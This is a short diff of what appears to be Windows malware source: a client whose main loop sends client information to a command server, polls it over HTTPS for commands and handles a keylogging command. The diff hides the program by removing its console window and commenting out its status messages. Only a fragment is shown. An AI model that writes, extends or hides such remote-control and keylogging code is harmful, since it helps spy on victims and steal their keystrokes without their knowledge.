@@ -5,9 +5,6 @@ EXTERN_C_START
 /********************************************************************************************************************************/
 INT WINAPI wWinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPWSTR lpCmdLine, _In_ INT nCmdShow) 
 {
-    CreateConsole();
-    printf("%s\n", loader() ? "LoadLibrary -> OK" : "LoadLibrary -> ERROR");
-
     CreateDirectory(DATA_FOLDER_W, NULL);
 
     wprintf(L"command line : [%ls]\n", lpCmdLine);
@@ -26,12 +23,12 @@ INT WINAPI wWinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, 
 
     while (TRUE)
     {
-        printf("Sending client informations\n");
+        //printf("Sending client informations\n");
         if (!SendClientInformations())
             continue;
 
         //Polling for new commands
-        printf("Polling for new commands ...\n");
+        //printf("Polling for new commands ...\n");
         Commands commands = GetCommands(SERVER_NAME_A, HTTPS_PORT);
 
         if (commands.keylogs)
